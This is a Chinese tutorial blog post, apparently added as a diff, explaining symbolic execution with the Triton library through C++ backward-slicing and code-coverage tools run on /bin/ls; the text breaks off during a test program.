@@ -1,0 +1,1084 @@
+---
+layout: post
+title:  使用Triton实现符号执行
+date:   2023-02-07 00:08:01 +0300
+image:  2023-02-07-woman.jpg
+tags:   [note]
+---
+
+目前符号执行引擎的种类并不多，而且只有少数符号执行引擎支持在二进制程序上运行。较流行的二进制级符号执行引擎有Triton、angr及S2E等。KLEE是在LLVM中间位码上运行的符号执行引擎。在这里，将使用Triton进行讲解，因为它易于和Intel Pin集成在一起，并且其底层采用C++编写，因此执行速度更快。其他较流行的符号执行引擎包括KLEE和S2E，它们不在二进制代码上运行，而是在LLVM中间位码上运行。
+
+## Triton的介绍
+
+首先，我们详细了解一下Triton的主要功能。Triton是一款免费的开源二进制文件分析库，以其符号执行引擎而广为人知。它提供了C/C++和Python的API，且目前支持x86和x64指令集。读者可以下载Triton并找到相应文档。我已经在虚拟机的~/triton目录中预装了Triton 0.6版本（build 1364）。
+
+类似于libdft，Triton是一个实验性的工具（目前尚没有完全成熟的二进制级符号执行引擎），这意味着在使用过程中可能会遇到错误，这时可以在GitHub中进行报告。Triton还需要手动编写的特殊处理程序来处理每种类型的指令，告诉符号执行引擎该指令对符号状态的影响。因此，如果你正在分析的程序使用了Triton不支持的指令，可能会得到不正确的结果或者程序报错。
+
+接下来将使用Triton演示实际的符号执行示例，因为它易于使用，相对来讲有据可查并且是用C++编写的，所以它在性能方面优于以Python等语言编写的引擎。此外，Triton的混合执行模式是基于我们已经熟悉的Intel Pin实现的。
+
+Triton支持两种模式，即符号模拟模式（symbolic emulation mode）和混合执行模式（concolic execution mode），分别对应SSE和混合执行两种方式。在两种模式下，Triton都可以对部分状态进行具体化，以降低符号表达式的复杂度。回想一下，SSE并不是真正在运行程序，而是对其进行模拟；混合执行则运行程序并以元数据的形式跟踪符号状态。其结果就是，**由于符号模拟模式必须模拟每个指令对符号状态和具体状态的影响，因此其运行速度要慢于混合执行模式，而混合执行模式可以“免费”获得具体状态。**
+
+混**合执行模式依赖于Intel Pin，并且必须从头开始运行所分析的程序。相反，符号模拟模式仅模拟程序的一部分，如单个函数，而不是整个程序。**在本章中，读者将看到符号模拟模式和混合执行模式的实际示例。
+
+首先，Triton是一个离线符号执行引擎，从某种意义上说，它一次只探索一条路径，但是它具有快照机制，支持同时混合执行多条路径，而不必每次都重新开始。此外，它还结合了单色、粗粒度污点分析引擎。尽管本章不需要这些功能，但读者可以根据Triton的在线文档和示例对其进行更进一步的了解。
+
+Triton的最新版本支持Pin以外的二进制插桩平台和不同的约束求解器。本章中，我将仅使用默认设定，即Pin和Z3。虚拟机上安装的Triton版本要求2.14（71313）版本的Pin，读者可以在~/triton/pin-2.14-71313-gcc.4.4.7-linux目录中找到预装好的Pin。
+
+## 使用抽象语法树维护符号状态
+
+在符号模拟模式和混合执行模式下，Triton维护一组全局变量，包括符号表达式、寄存器和内存地址到这些符号表达式的映射以及一系列路径约束的集合。Triton将符号表达式和约束条件表示为抽象语法树（abstract syntax tree，AST），每一棵抽象语法树表示一个符号表达式或者一个约束条件。抽象语法树是一种树形数据结构，描述了操作和操作数之间的语法关系。抽象语法树的节点包含Z3的SMT语言中的运算符和操作数。
+
+### 完整的抽象语法树
+
+### 使用引用的抽象语法树
+
+读者可能已经注意到，完整的抽象语法树包含很多冗余信息：每当一棵抽象语法树依赖于上一棵抽象语法树时，上一棵抽象语法树就会成为新抽象语法树的子树。庞大而复杂的程序在操作之间存在许多依赖关系，因此这种方案会导致不必要的内存开销。这就是Triton使用引用来更紧凑地表示抽象语法树的原因。
+
+在此方案中，每棵抽象语法树都有一个名称，如ref!1、ref!2等，你可以从另一棵抽象语法树引用它们。这样，你不必整个复制之前的抽象语法树，只需在新的抽象语法树中包含一个引用节点（reference node）即可对其进行引用。程序经过and exa,0x1指令后将整个exa的抽象语法树的左子树替换为引用先前抽象语法树的单个引用节点，同时将15个节点压缩为1个节点。
+
+Triton提供了一个名为unrollAst的API函数，该函数支持将带有引用的抽象语法树扩展为完整的抽象语法树，以便用户可以手动检查、操作或将其传递给Z3。现在你已经熟悉了Triton的基本工作原理，下面我们来看一些具体示例，学习如何在实际中使用unrollAst和其他Triton函数。
+
+## 使用Triton进行后向切片
+
+第一个示例是用Triton的符号模拟模式进行后向切片。该示例是Triton随附示例的通用版本。原始的Triton工具使用的是Python API，但这里我选择使用Triton的C/C++ API。在后面，将看到一个使用Python编写Triton工具的示例。
+
+回想一下，后向切片是一种二进制分析技术，它可以告诉你在执行过程中的某个时刻，之前的哪些指令会影响给定寄存器或内存地址的值。如清单13-1所示，假设你想要计算/bin/ls的代码片段中关于rcx在地址0x404b1e处的后向切片。
+
+/bin/ls的反汇编片段
+
+```assembly
+$ objdump -M intel -d /bin/ls
+...
+404b00: 49 89 cb           mov       r11,rcx
+404b03: 48 8b 0f           mov       rcx,QWORD PTR [rdi]
+404b06: 48 8b 06           mov       rax,QWORD PTR [rsi]
+404b09: 41 56              push      r14
+404b0b: 41 55              push      r13
+404b0d: 41 ba 01 00 00 00  mov       r10d,0x1
+404b13: 41 54              push      r12
+404b15: 55                 push      rbp
+404b16: 4c 8d 41 01        lea       r8,[rcx+0x1]
+404b1a: 48 f7 d1           not       rcx
+404b1d: 53                 push      rbx
+404b1e: 49 89 c9           mov       r9,rcx
+...
+```
+
+后向切片包含所有在地址0x404b1e处影响rcx值的指令。因此，该切片应包括以下指令：
+
+```assembly
+404b03: mov rcx,QWORD PTR [rdi]
+404b1a: not rcx
+404b1e: mov r9,rcx
+```
+
+接下来，我们看一看如何使用Triton自动计算后向切片。首先学习如何构建后向切片工具，然后使用它对所示的代码片段进行切片来产生与上述手动切片相同的结果。
+
+由于Triton将符号表达式表示为相互引用的抽象语法树，因此程序可以轻松计算给定表达式的后向切片。下面展示了后向切片工具实现代码的第一部分。同之前一样，清单中省略了标准C/C++头文件。
+
+```assembly
+/*
+ * Output the backward slice with respect to the specified register, starting from the
+ * given instruction.
+ *
+ * Based on Triton's backward_slicing.py example (src/examples/python/backward_slicing.py).
+ *
+ * Uses Triton's symbolic emulation mode.
+ */
+
+#include <stdio.h>
+#include <stdint.h>
+#include <stdlib.h>
+
+#include "../inc/loader.h"
+#include "triton_util.h"
+#include "disasm_util.h"
+
+#include <string>
+#include <map>
+
+#include <triton/api.hpp>
+#include <triton/x86Specifications.hpp>
+
+
+int main(int argc, char *argv[]){
+  	Binary bin;
+  	triton::API api;
+  	triton::arch::registers_e ip;
+  	std::map<triton::arch::registers_e, uint64_t> regs;
+  	std::map<uint64_t, uint8_t> mem;
+
+  	if(argc < 6) {
+    	printf("Usage: %s <binary> <sym-config> <entry> <slice-addr> <reg>\n", argv[0]);
+    	return 1;
+  	}
+
+  	std::string fname(argv[1]);
+  	if(load_binary(fname, &bin, Binary::BIN_TYPE_AUTO) < 0)
+  		return 1;
+
+  	if(set_triton_arch(bin, api, ip) < 0)
+  		return 1;
+  	api.enableMode(triton::modes::ALIGNED_MEMORY, true);
+
+  	if(parse_sym_config(argv[2], &regs, &mem) < 0) return 1;
+  	for(auto &kv: regs) {
+    	triton::arch::Register r = api.getRegister(kv.first);
+    	api.setConcreteRegisterValue(r, kv.second);
+  	}
+  	for(auto &kv: mem) {
+    	api.setConcreteMemoryValue(kv.first, kv.second);
+  	}
+
+  	uint64_t pc         = strtoul(argv[3], NULL, 0);
+  	uint64_t slice_addr = strtoul(argv[4], NULL, 0);
+  	Section *sec = bin.get_text_section();
+
+  	while(sec->contains(pc)) {
+    	char mnemonic[32], operands[200];
+    	int len = disasm_one(sec, pc, mnemonic, operands);
+    	if(len <= 0) return 1;
+
+    	triton::arch::Instruction insn;
+    	insn.setOpcode(sec->bytes+(pc-sec->vma), len);
+    	insn.setAddress(pc);
+
+    	api.processing(insn);
+
+    	for(auto &se: insn.symbolicExpressions) {
+      		std::string comment = mnemonic; comment += " "; comment += operands;
+      		se->setComment(comment);
+    	}
+
+    	if(pc == slice_addr) {
+      		print_slice(api, sec, slice_addr, get_triton_regnum(argv[5]), argv[5]);
+      		break;
+    	}
+
+    	pc = (uint64_t)api.getConcreteRegisterValue(api.getRegister(ip));
+  	}
+
+  	unload_binary(&bin);
+
+  	return 0;
+}
+```
+
+该工具需要以命令行参数的形式获取待分析的二进制文件的文件名、符号配置文件、开始分析的入口点地址、待计算切片的地址以及与之相关的寄存器等。
+
+稍后将解释符号配置文件的用途。请注意，这里的入口点地址只是切片工具将要模拟的第一条指令的地址，它不必与二进制文件的入口点地址相同。如果要对示例代码进行切片的话，读者可以将0x404b00作为入口点地址，来分析模拟清单中位于切片地址之前的所有指令。
+
+backward_slicing的输出是切片中的汇编指令的列表。接下来，我们将从程序必要的包含文件和main函数开始，更详细地了解backward_slicing生成程序切片的过程。
+
+### Triton的头文件以及相关配置
+
+在代码中你会注意到的第一件事是它包含了头文件../inc/loader.h，这是因为backward_slicing使用了在第4章中开发的二进制加载器。它还包含了头文件triton_util.h和disasm_util.h，它们提供了一些实用函数，稍后会对它们进行介绍。代码最后包含的是两个Triton特有的头文件，都带有.hpp扩展名：triton/api.hpp提供了主要的Triton C++ API，而triton/x86Specifications.hpp提供了x86特有的定义，如寄存器定义。除了包括这些头文件之外，还必须在链接时使用-ltriton标志来使用Triton的符号模拟模式。
+
+main函数首先使用二进制加载程序中的load_binary函数加载待分析的二进制文件。然后，它使用定义在ackward_slicing.cc中的set_triton_arch函数将Triton配置为二进制的体系结构。它还调用Triton的api.enableMode函数来启用Triton的ALIGNED_MEMORY模式，其中api是类triton::API的对象，triton::API是Triton提供C++ API的主要类。
+
+回想一下，由于符号执行引擎必须对内存访问的所有可能结果进行建模，因此符号内存访问会大大增加符号状态的空间和复杂度。Triton的 ALIGNED_MEMORY模式是一种优化方法，它假设内存加载和存储时使用对齐的内存地址，从而减少符号内存的占用。如果你知道程序内存访问是对齐的，或者精确的内存地址对分析并不重要的话，则可以放心地启用此优化。
+
+### 符号化配置文件
+
+在大多数符号执行工具中，需要将某些寄存器和内存地址符号化，或者将它们设置为特定的具体值。将哪部分状态符号化以及使用什么样的具体值取决于你正在分析的应用程序以及要探索的路径。因此，如果要对符号化和具体化状态的决策方法进行硬编码，那么你的符号执行工具将是因应用而异的。
+
+为避免这种情况，我们创建一个简单的符号配置文件（symbolic configuration file），用以在其中配置这些决策。Triton在triton_util.h中定义了一个名为parse_sym_config的实用函数，读者可以使用它来解析符号配置文件并将其加载到符号执行工具中。以下为一个符号配置文件的示例：
+
+```assembly
+%rax=0
+%rax=$
+@0x1000=5
+```
+
+在符号配置文件中，%name表示寄存器，@address表示内存地址。你可以为每个寄存器或内存字节分配具体值，或者通过将其值设为$使其符号化。如此配置文件首先将rax赋值为0，然后将其符号化，并将内存地址0x1000处的字节赋值为5。请注意，rax是符号化的，但其同时具有将模拟驱动到正确路径的具体值。
+
+现在，让我们回到代码。在加载二进制文件和配置Triton后，backward_slicing调用parse_sym_config函数来解析命令行指定的符号配置文件。此函数将配置文件的文件名作为输入，后接两个std::map对象（均为通过parse_sym_config函数读取配置文件后的引用）参数。第一个std::map参数将Triton寄存器名称（名为triton::arch::registers_e、enum类型）映射到包含寄存器内容的具体uint64_t值，而第二个std::map参数将内存地址映射到具体字节值。
+
+实际上，parse_sym_config函数需要另外两个可选参数来加载符号化的寄存器列表和内存地址列表。这里我没有使用它们，因为在计算切片时，我们只对Triton构建的抽象语法树感兴趣，并且默认情况下，Triton甚至也会为没有显式符号化的寄存器和内存位置构建抽象语法树。
+
+在直接调用parse_sym_config函数后，backward_slicing的main函数包含两个for循环。第一个for循环遍历刚刚加载的具体寄存器值的映射，并告诉Triton将这些具体值分配给其内部状态。为此，你需要调用api.setConcrete RegisterValue方法，该方法将Triton寄存器和具体的整数值作为输入。可以使用api.getRegister函数以Triton寄存器名称（名为triton::arch:: registers_e、enum类型）来获取类型为triton::arch::Register的Triton寄存器。每个寄存器名称的格式为ID_REG_name，其中name是大写的寄存器的名称，如AL、EBX、RSP等。
+
+类似地，第二个for循环遍历具体内存值的映射，并使用api.setConcrete MemoryValue方法告诉Triton有关它们的信息，该方法以内存地址和具体字节值作为输入。
+
+### 模拟指令
+
+加载符号配置文件是backward_slicing的设置代码的最后一部分。接下来，模拟二进制文件中指令的主模拟循环从用户指定的入口点地址开始运行，一直持续到需要计算切片的指令地址。这种模拟循环在用Triton编写的符号模拟工具中几乎处处可见。
+
+模拟循环只是一个while循环，当切片完成或遇到二进制文件的.text部分之外的指令地址时，它就会停止。模拟程序计数器pc会跟踪当前的指令地址。
+
+循环的每次迭代都通过调用disasm_one函数从反汇编当前指令开始，这是在disasm_util.h中提供的另一个实用函数。它使用Capstone来获取程序之后所需要的、包含指令助记符和操作数的字符串。
+
+接下来，backward_slicing将为当前指令建立类型为triton::arch:: Instruction的Triton指令对象，并调用Instruction对象的setOpcode函数，用来自二进制文件.text部分的指令操作码字节为其赋值。它还调用setAddress函数将Instruction对象的地址赋给pc。
+
+在为当前指令创建Triton的Instruction对象之后，模拟循环调用api. processing函数处理该指令。尽管api.processing函数名称普通，但其对Triton符号模拟工具非常重要，因为它模拟执行实际的指令并根据模拟结果改变Triton的符号化和具体化的状态。
+
+在当前指令处理结束后，Triton将建立内部抽象语法树，这些语法树表示受该指令影响的寄存器和内存状态的符号表达式。稍后，将看到如何使用这些符号表达式来计算后向切片。**若要生成包含x86指令而不是SMT-LIB 2.0格式的符号表达式的切片，需要跟踪与每个符号表达式关联的每一条指令。**backward_slicing工具通过遍历与刚刚处理过的指令关联的所有符号表达式的列表，并用包含之前从disasm_one函数获得的运算符和操作数字符串❽的注释来修饰每个表达式，从而达到此目的。
+
+可以通过Instruction对象的symbolicExpressions成员来访问其符号表达式列表，该成员是std::vector<triton::engines::symbolic::SymbolicExpression*>类型的对象。SymbolicExpression类提供了一个名为setComment的函数，该函数支持为符号表达式指定注释字符串。
+
+当模拟到达切片地址时，backward_slicing调用print_slice函数计算并输出切片，然后跳出模拟循环。请注意，get_triton_regnum是triton_util.h中的另一个实用函数，该函数根据可读的寄存器名称返回相应的Triton寄存器标识符。在这里，它返回要切片的寄存器的标识符，然后传递给print_slice函数。
+
+当调用Triton的processing函数时，Triton在内部更新具体的指令指针值来指向下一条指令。在每次模拟循环迭代的最后，都可以调用函数api.get ConcreteRegisterValue获取新的指令指针值，并将其分配给你自己的驱动模拟循环的程序计数器（在本例中称为pc）。**请注意，对32位x86程序来说，你需要获取eip的内容，而对x64程序来说，指令指针为rip。**接下来我们看一下前面提到的set_triton_arch函数如何使用正确指令指针寄存器的标识符配置ip变量，以供模拟循环使用。
+
+### 设置Triton的体系结构
+
+backward_slicing工具的main函数调用set_triton_arch函数来使用二进制指令集配置Triton，并获取该体系结构中使用的指令指针寄存器的名称。下面展示了set_triton_arch函数的实现方式。
+
+backward_slicing.cc（续）
+
+```assembly
+static int set_triton_arch(Binary &bin, triton::API &api, triton::arch::registers_e &ip){
+    if(bin.arch != Binary::BinaryArch::ARCH_X86) {
+    	fprintf(stderr, "Unsupported architecture\n");
+    	return -1;
+  	}
+
+  	if(bin.bits == 32) {
+    	api.setArchitecture(triton::arch::ARCH_X86);
+    	ip = triton::arch::ID_REG_EIP;
+  	} else if(bin.bits == 64) {
+    	api.setArchitecture(triton::arch::ARCH_X86_64);
+    	ip = triton::arch::ID_REG_RIP;
+  	} else {
+    	fprintf(stderr, "Unsupported bit width for x86: %u bits\n", bin.bits);
+    	return -1;
+  	}
+
+  	return 0;
+}
+```
+
+该函数具有3个参数：对二进制加载器返回的Binary对象的引用、对Triton API的引用以及对存储了指令指针寄存器名称的triton::arch::registers_e的引用。如果执行成功，set_triton_arch函数返回0，否则返回−1。
+
+首先，set_triton_arch函数确保它处理的是x86二进制文件（32位或64位）。如果不是的话，函数将返回错误，因为目前Triton无法处理x86以外的体系结构。
+
+如果程序未报错，接着set_triton_arch函数检查二进制的位宽。如果二进制文件使用32位x86，则函数将Triton配置为32位x86模式（triton::arch:: ARCH_X86），并将ID_REG_EIP设置为指令指针寄存器的名称。同样，如果是x64二进制文件的话，该函数将Triton设置为triton::arch::ARCH_X86_64结构，并将ID_REG_RIP设置为指令指针。如果要配置Triton体系结构的话，需使用api.setArchitecture函数，该函数的唯一参数是体系结构类型。
+
+### 计算后向切片
+
+为了计算和输出实际的切片，当模拟到达切片的地址时，backward_slicing调用print_slice函数。
+
+backward_slicing.cc（续）
+
+```assembly
+static void print_slice(triton::API &api, Section *sec, uint64_t slice_addr, 
+            triton::arch::registers_e reg, const char *regname){
+  	triton::engines::symbolic::SymbolicExpression *regExpr;
+  	std::map<triton::usize, triton::engines::symbolic::SymbolicExpression*> slice;
+  	char mnemonic[32], operands[200];
+
+  	regExpr = api.getSymbolicRegisters()[reg];
+  	slice = api.sliceExpressions(regExpr);
+
+  	for(auto &kv: slice) {
+    	printf("%s\n", kv.second->getComment().c_str());
+  	}
+
+  	disasm_one(sec, slice_addr, mnemonic, operands);
+  	std::string target = mnemonic; target += " "; target += operands;
+
+  	printf("(slice for %s @ 0x%jx: %s)\n", regname, slice_addr, target.c_str());
+}
+```
+
+回想一下，切片是针对reg参数指定的特定寄存器计算的。要计算切片的话，需要在切片地址上模拟指令产生的与该寄存器相关联的符号表达式。为了获得该表达式，print_slice函数调用函数api.getSymbolicRegisters获得所有寄存器到其关联的符号表达式的映射，然后索引该映射获取与reg关联的表达式。接下来，它调用api.sliceExpressions函数获取与reg表达式有关的所有符号表达式的切片。该函数以std::map的形式返回切片，该映射将整数表达式标识符映射到triton:: engines::symbolic::SymbolicExpression*对象。
+
+现在我们有了一份符号表达式的切片，但是真正想要的是一份x86汇编指令的切片。这正是符号表达式注释的目的，该注释将每个表达式与生成该表达式的指令的运算符和操作数字符串相关联。因此要输出切片的话，print_slice函数只需在符号表达式的切片上循环，并使用getComment函数获取其注释，然后将注释输出到屏幕上。完整起见，print_slice函数还会反汇编你在程序中计算切片的指令，并同样将其输出到屏幕上。
+可以通过执行展示的命令在虚拟机上尝试运行backward_slice程序。
+
+计算0x404b1e处与rcx相关的后向切片
+
+```assembly
+binary@binary-VirtualBox:~/code/chapter13$ ./backward_slicing /bin/ls empty.map 0x404b00 0x404b1e rcx
+mov rcx, qword ptr [rdi]
+not rcx
+(slice for rcx @ 0x404b1e: mov r9, rcx)
+```
+
+在这里，我使用back_slicing来计算/bin/ls代码片段。我使用了一个空的符号配置文件（empty.map），并将0x404b00、0x404b1e及rcx分别指定为入口点地址、切片地址及要计算切片的寄存器。你会看到，这会产生与之前看到的手动计算的切片相同的输出。
+
+此示例中符号配置文件可以为空的原因是，该分析不依赖于任何特定的符号化寄存器或内存位置，并且由于待分析的代码片段不包含分支，因此你不需要特定的具体值来驱动执行。接下来我们来看另一个示例，在该示例中，你需要非空的符号配置来探索同一程序中的多条路径。
+
+## 使用Triton提升代码覆盖率
+
+在后向切片的示例中，Triton只跟踪寄存器和内存位置的符号表达式，并没有充分发挥符号执行通过约束求解来推理程序属性的核心优势。在下面的示例中，将通过符号执行中一个经典的代码覆盖（code coverage）示例来熟悉Triton的约束求解功能。
+
+下面给出了code_coverage工具源代码的第一部分，其中许多地方和上一示例相同或相似。列表省略了set_triton_arch函数，因为它与backward_slicing中的此函数完全相同，因此不赘述。
+
+code_coverage.cc
+
+```assembly
+/*
+ * Symbolically execute up to and including a given jump instruction, and then compute an input
+ * to take the branch direction that wasn't taken previously.
+ *
+ * Uses Triton's symbolic emulation mode.
+ */
+
+#include <stdio.h>
+#include <stdint.h>
+#include <stdlib.h>
+
+#include "../inc/loader.h"
+#include "triton_util.h"
+#include "disasm_util.h"
+
+#include <string>
+#include <map>
+#include <vector>
+
+#include <triton/api.hpp>
+#include <triton/x86Specifications.hpp>
+
+
+int main(int argc, char *argv[]){
+    Binary bin;
+  	triton::API api;
+  	triton::arch::registers_e ip;
+  	std::map<triton::arch::registers_e, uint64_t> regs;
+  	std::map<uint64_t, uint8_t> mem;
+  	std::vector<triton::arch::registers_e> symregs;
+  	std::vector<uint64_t> symmem;
+
+  	if(argc < 5) {
+    	printf("Usage: %s <binary> <sym-config> <entry> <branch-addr>\n", argv[0]);
+    	return 1;
+  	}
+
+  	std::string fname(argv[1]);
+  	if(load_binary(fname, &bin, Binary::BIN_TYPE_AUTO) < 0)
+  		return 1;
+
+  	if(set_triton_arch(bin, api, ip) < 0)
+  		return 1;
+  	api.enableMode(triton::modes::ALIGNED_MEMORY, true);
+ 
+  	if(parse_sym_config(argv[2], &regs, &mem, &symregs, &symmem) < 0)
+  		return 1;
+  	for(auto &kv: regs) {
+    	triton::arch::Register r = api.getRegister(kv.first);
+    	api.setConcreteRegisterValue(r, kv.second);
+  	}
+  	for(auto regid: symregs) {
+    	triton::arch::Register r = api.getRegister(regid);
+    	api.convertRegisterToSymbolicVariable(r)->setComment(r.getName());
+  	}
+  	for(auto &kv: mem) {
+    	api.setConcreteMemoryValue(kv.first, kv.second);
+  	}
+  	for(auto memaddr: symmem) {
+    	api.convertMemoryToSymbolicVariable(triton::arch::MemoryAccess(memaddr, 1))->setComment(std::to_string(memaddr));
+  	}
+
+  	uint64_t pc          = strtoul(argv[3], NULL, 0);
+  	uint64_t branch_addr = strtoul(argv[4], NULL, 0);
+  	Section *sec = bin.get_text_section();
+
+  	while(sec->contains(pc)) {
+    	char mnemonic[32], operands[200];
+    	int len = disasm_one(sec, pc, mnemonic, operands);
+    	if(len <= 0)
+    		return 1;
+
+    	triton::arch::Instruction insn;
+    	insn.setOpcode(sec->bytes+(pc-sec->vma), len);
+    	insn.setAddress(pc);
+
+    	api.processing(insn);
+
+    	if(pc == branch_addr) {
+      		find_new_input(api, sec, branch_addr);
+      		break;
+    	}
+
+    	pc = (uint64_t)api.getConcreteRegisterValue(api.getRegister(ip));
+  	}
+
+  	unload_binary(&bin);
+
+  	return 0;
+}
+```
+
+code_soverage工具的命令行参数包括：待分析的二进制文件、配置文件、分析的入口地址及直接分支指令的地址。该工具假设符号配置文件包含具体输入，这些输入会导致程序选择分支中的一条路径运行（选择哪条路径都可以）。然后，它使用约束求解器来计算一个包含新的具体输入的解，这些新输入将导致程序沿分支的另一个方向运行。为了使约束求解器成功求解，被翻转分支涉及的所有寄存器和内存位置都需要被符号化。
+
+如上面所示，code_soverage包含与backward_slicing相同的实用函数和Triton头文件。此外，code_soverage的主要功能与backward_slicing的主要功能几乎相同。从代码可以看出，它首先加载二进制文件并配置Triton体系结构，然后启用ALIGNED_MEMORY优化。
+
+### 创建符号变量
+
+code_coverage与backward_slicing的区别在于，解析符号配置文件的代码将两个可选参数（symregs和symmem）传递给parse_sym_config函数。parse_sym_config函数根据配置文件将需要符号化的寄存器和内存位置写入这两个参数中。在配置文件中，将包含用户输入的所有寄存器和内存位置符号化，这样约束求解器返回的模型将包含用户输入的每一个具体值。
+
+从配置文件中分配了具体的值之后，main循环遍历符号化寄存器列表并使用Triton的api.convertRegisterToSymbolicVariable函数对其进行符号化。用于符号化寄存器的代码会立即在刚刚创建的符号变量上设置注释，并指定寄存器的用户可读名称。这样，当你以后从约束求解器获得解时，你将知道如何将模型中的符号变量分配回实际的寄存器和内存中。
+
+符号化内存位置的循环与之类似。程序对要符号化的每个内存位置构建一个triton::arch::MemoryAccess对象，该对象指定内存位置的地址和大小（以字节为单位）。在这种情况下，将内存位置的大小硬编码为1字节，因为配置文件格式仅支持以字节为单位引用内存位置。读者可以调用Triton函数api.convert MemoryToSymbolicVariable来符号化在MemoryAccess对象中指定的地址。之后，循环设置注释，将新的符号变量映射到包含内存地址的用户可读字符串。
+
+### 寻找新路径的解
+
+code_coverage中的模拟循环和backward_slicing中的类似，但该循环直到pc等于用于查找新输入集的分支的地址时才停止。如下面所示，code_coverage调用find_new_input函数来查找新的输入集。
+
+code_coverage.cc（续）
+
+```assembly
+static void find_new_input(triton::API &api, Section *sec, uint64_t branch_addr){
+    triton::ast::AstContext &ast = api.getAstContext();
+  	triton::ast::AbstractNode *constraint_list = ast.equal(ast.bvtrue(), ast.bvtrue());
+
+  	printf("evaluating branch 0x%jx:\n", branch_addr);
+
+  	const std::vector<triton::engines::symbolic::PathConstraint> &path_constraints = api.getPathConstraints();
+  	for(auto &pc: path_constraints) {
+    	if(!pc.isMultipleBranches()) continue;
+    		for(auto &branch_constraint: pc.getBranchConstraints()) {
+      			bool flag         = std::get<0>(branch_constraint);
+      			uint64_t src_addr = std::get<1>(branch_constraint);
+      			uint64_t dst_addr = std::get<2>(branch_constraint);
+      			triton::ast::AbstractNode *constraint = std::get<3>(branch_constraint);
+
+      		if(src_addr != branch_addr) {
+        		/* this is not our target branch, so keep the existing "true" constraint */
+        		if(flag) {
+          		constraint_list = ast.land(constraint_list, constraint);
+        		}
+      		} else {
+        		/* this is our target branch, compute new input */
+        		printf("    0x%jx -> 0x%jx (%staken)\n", src_addr, dst_addr, flag ? "" : "not ");
+
+        		if(!flag) {
+          			printf("    computing new input for 0x%jx -> 0x%jx\n", src_addr, dst_addr);
+          			constraint_list = ast.land(constraint_list, constraint);
+          			for(auto &kv: api.getModel(constraint_list)) {
+            			printf("      SymVar %u (%s) = 0x%jx\n", kv.first, api.getSymbolicVariableFromId(kv.first)->getComment().c_str(), (uint64_t)kv.second.getValue());
+          			}
+        		}
+      		}
+    	}
+  	}
+}
+```
+
+find_new_input函数向约束求解器提供实现到达指定分支的约束列表，然后询问约束求解器满足这些约束的解，以此来得出能够到达先前未探索的分支方向的输入。由于Triton将约束表示为抽象语法树，因此你需要构建相应的抽象语法树来对分支约束进行编码。find_new_input函数首先调用函数api.getAstContext来获取对AstContext（这是Triton抽象语法树公式的构建器类，称为ast）的引用。
+
+find_new_input函数使用triton::ast::AbstractNode对象来存储对通向未探索分支方向的路径进行建模的约束列表，该对象可以通过指针constraint_list来访问。程序将constraint_list初始化为公式ast.equal(ast. bvtrue(),ast.bvtrue())的值，这表示逻辑重言式true==true，其中每个true都是一个位向量。这只是将约束列表初始化为有效语法公式的一种方式，该公式不施加任何约束，并且可以将其他约束链接到该公式。
+
+#### 复制和翻转分支约束
+
+接下来，find_new_input函数调用api.getPathConstraints函数获取Triton在模拟代码时积累的路径约束列表。该列表为triton::engines:: symbolic::PathConstraint对象的std::vector向量，其中每个Path Constraint对象都与一个分支指令关联。该列表包含选择合理的模拟路径时必须满足的所有约束。如果要将该列表转变为新路径的约束列表的话，你可以复制除了需要更改的分支的约束以外的所有约束，然后将其翻转到另一个分支方向。
+
+为了实现这一点，find_new_input函数在路径约束列表上循环并复制或翻转每个约束。在每个PathConstraint对象内部，Triton为每个可能的分支方向存储一个分支约束（branch constraint）。在考虑代码覆盖率时，你只需要考虑诸如条件跳转的多路分支，因为单向分支（如直接调用或无条件跳转）没有任何新的探索方向。你可以调用函数pc.isMultipleBranches来确定名为pc的PathConstraint对象是否表示多路分支，如果其为多路分支的话，函数返回true。
+
+对于包含多个分支约束的PathConstraint对象，find_new_input函数通过调用pc.getBranchConstraints函数获取所有的分支约束，然后循环遍历列表中的每个约束。每个约束都是由布尔标志、源地址和目标地址（均为triton:: uint64）以及对分支约束进行编码的抽象语法树组成的元组。布尔标志表示在模拟过程中程序是否选择了分支约束表示的分支方向。考虑以下条件分支：
+
+```assembly
+4055dc:    3c 25                 cmp   al,0x25
+4055de:    0f 8d f4 00 00 00     jge   4056d8
+```
+
+在模拟jge指令时，Triton会创建具有两个分支约束的PathConstraint对象。假设第一个分支约束表示jge采用（taken）的方向（即条件成立采用的方向），并且这是模拟时选择的方向。这意味着存储在PathConstraint对象中的第一个分支约束有true标志（因为模拟选择该方向），并且源地址和目标地址将分别为0x4055de（jge的地址）和0x4056d8（jge的目标地址）。此分支条件的抽象语法树将对条件al≥0x25进行编码。第二个分支约束具有false标志，代表模拟未采用该分支方向。源地址和目标地址为0x4055de和0x4055e4（jge条件不成立时的跳转地址），并且抽象语法树编码的条件为al<0x25（或更准确地说，不是≥0x25）。
+
+接下来，除了与待翻转的分支指令相关联的PathConstraint对象，find_new_input函数会复制所有标志为true的分支约束；而对与待翻转的分支指令相关联的PathConstraint对象而言，find_new_input函数会复制所有标志为false的分支约束，从而翻转该分支决策。find_new_input函数使用分支的源地址识别待翻转的分支。对源地址与待翻转的分支地址不相等的约束来说，find_new_input函数复制带有true标志的分支约束，并调用由ast.land函数实现的逻辑AND将其加入constraint_list。
+
+#### 从约束求解器获取解
+
+最后，find_new_input函数将遇到与待翻转的分支关联的PathConstraint对象。它包含多个分支约束，这些分支约束的源地址等于待翻转分支的地址。为了清楚地显示code_coverage的输出中所有可能的分支方向，无论标志是否为true，find_new_input函数都会使用匹配的源地址来输出每个分支条件。
+
+如果该标志为true，则find_new_input函数不会将分支约束附加到constraint_list，因为它对应已经探索过的分支方向。但是，如果标志为false，则表示未探索的分支方向，因此find_new_input函数将此分支约束添加到约束列表，并通过调用api.getModel函数将列表传递给约束求解器。
+
+getModel函数调用约束求解器Z3获取满足约束列表的模型。如果模型存在的话，getModel函数会将其作为std::map类型返回，该映射将Triton符号变量标识符映射到triton::engines::solver::SolverModel对象。该模型表示被分析程序的一组新的具体输入，它将使得该程序采用以前未探索过的分支方向。如果解模型不存在的话，函数返回的映射为空。
+
+每个SolverModel对象都包含解模型中约束求解器分配给相应符号变量的具体值。code_coverage工具通过遍历映射表并输出每个符号变量的ID和注释向用户报告解模型内容，注释中包含对应的寄存器或内存的可读名称、位置以及解模型中分配的具体值（由SolverModel::getValue返回）。
+
+接下来我们用一个测试程序来学习如何在实践中使用code_coverage的输出，以查找并使用新的输入来覆盖你所选择的分支。
+
+### 测试代码覆盖工具
+
+下面展示了一个简单的测试程序，可以对该程序使用code_coverage以生成探索新分支方向的输入。
+
+branch.c
+
+```assembly
+#include <stdio.h>
+#include <stdlib.h>
+
+
+void branch(int x, int y){
+  	if(x < 5) {
+    	if(y == 10)
